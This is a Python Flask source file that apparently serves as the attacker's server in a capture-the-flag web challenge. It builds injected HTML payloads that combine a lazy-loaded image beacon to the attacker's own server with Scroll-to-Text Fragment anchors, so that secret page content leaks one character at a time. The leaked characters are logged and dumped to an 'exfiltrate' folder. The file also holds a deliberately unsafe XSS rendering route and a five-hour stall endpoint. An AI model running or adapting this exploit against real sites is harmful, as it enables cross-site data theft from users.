
from time import sleep
from urllib.parse import quote
from flask import Flask, render_template, render_template_string, request, jsonify
from context import CONTEXT as context
import json
from datetime import datetime

app = Flask(__name__)
hit_count = 0
log_per_hit_count = 2

EMOJIS = ["^_^", ">_<", "owo", ":3", "uwu", "xD", "._.", "o_o", "T_T", "ಠ_ಠ", ":D", ":)", ":P", ";)", "-_-", ">:3", "♡", "｡^‿^｡", "(≧◡≦)", "ʕ•ᴥ•ʔ"]

@app.route("/", methods=["GET"])
def index():
    emoji = request.args.get("emoji")
    char = request.args.get("char")
    test = request.args.get("test")
    multi = request.args.get("multi")

    if test:
        payload = f"<div style='height: 10000px; width:100%; display: block;'>padding</div><div style='display: block'> IFHITNOTCHAR </div><img loading='lazy' src='{context['my_server']}/hit/test'>"
        sstf_payload = f"#:~:text=>_<%0A{test}&text=IFHITNOTCHAR" 
        target_with_payload = context['target_internal'] + f"/dashboard?cok={quote(payload)}{sstf_payload}"
        return render_template("redirect.html", url=target_with_payload)
    
    if multi:
        anchor = ""
        for emoji in EMOJIS:
            anchor += f"text={emoji}%0A{char}&"
        payload = f"<div style='height: 10000px; width:100%; display: block;'>padding</div><div style='display: block'> IFHITNOTCHAR </div><img loading='lazy' src='{context['my_server']}/hit2/{char}'>"
        sstf_payload = f"#:~:{anchor}text=IFHITNOTCHAR" 
        target_with_payload = context['target_internal'] + f"/dashboard?cok={quote(payload)}{sstf_payload}"
        return render_template("redirect.html", url=target_with_payload)

    if not char or not emoji:
        return "bruh" 
    
    anchor = f"{emoji}%0A{char}"
    payload = f"<div style='height: 10000px; width:100%; display: block;'>padding</div><div style='display: block'> IFHITNOTCHAR </div><img loading='lazy' src='{context['my_server']}/hit/{anchor}'>"
    sstf_payload = f"#:~:text={anchor}&text=IFHITNOTCHAR" 
    target_with_payload = context['target_internal'] + f"/dashboard?cok={quote(payload)}{sstf_payload}"

    return render_template("redirect.html", url=target_with_payload)

@app.route("/redirect", methods=["GET"])
def redir():
    url = request.args.get("url")
    return render_template("redirect.html", url=url)

@app.route("/exfil_test", methods=["GET"])
def test_exfil():
    return render_template("exfil_flag.html")

@app.route("/hit/<payload>", methods=["GET"])
def attack(payload):
    
    print("[+] hit:", payload)

    if payload == "test":
        print("[!][!][!][!] TEST BERHASIL [!][!][!][!]")

    try:
        payload = payload.split("\n")
        emoji = payload[0]
        char = payload[1]
        print(emoji," - ", char)
        context['survive'][emoji].remove(char)

        # LOGGING
        global hit_count
        global log_per_hit_count
        
        hit_count += 1
        if hit_count % log_per_hit_count == 0:
            now = datetime.now()
            with open(f"./exfiltrate/data-{now.strftime("%H_%M_%S")}.json", "w") as f:
                json.dump(context, f, indent=4)
    except ValueError:
        pass
    except Exception as e:
        print("[!] hits error. might want to check that out")
        print("[!!] ERROR:", e)
    finally:
        return "noted."
    
@app.route("/hit2/<payload>", methods=["GET"])
def attack2(payload):
    
    print("[+] hit ALL:", payload)

    if payload == "test":
        print("[!][!][!][!] TEST BERHASIL [!][!][!][!]")

    try:
        context['not_in_any_emojis'].append(payload)

        # LOGGING
        global hit_count
        global log_per_hit_count
        
        hit_count += 1
        if hit_count % log_per_hit_count == 0:
            now = datetime.now()
            with open(f"./exfiltrate/data-{now.strftime("%H_%M_%S")}.json", "w") as f:
                json.dump(context, f, indent=4)
    except ValueError:
        pass
    except Exception as e:
        print("[!] hits error. might want to check that out")
        print("[!!] ERROR:", e)
    finally:
        return "noted."

@app.route("/verify/<token>", methods=["GET"])
def verify(token):
    print(f"Verifying for 5 hours with token {token}")
    sleep(5 * 60 * 60)
    return "noted."

@app.route("/xss_test", methods=["GET"])
def xss_test():
    q = request.args.get("cok")
    return render_template_string("""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Test</title>
</head>
<body>
    {{ xss | safe }}
</body>
</html>""", xss=q)

# CHECK STATE ENDPOINT
@app.route("/hits", methods=["GET"])
def hits():
    return jsonify(context['hits'])

@app.route("/survival", methods=["GET"])
def survive():
    return jsonify(context['survive'])


if __name__ == "__main__":
    app.run(debug=True)
    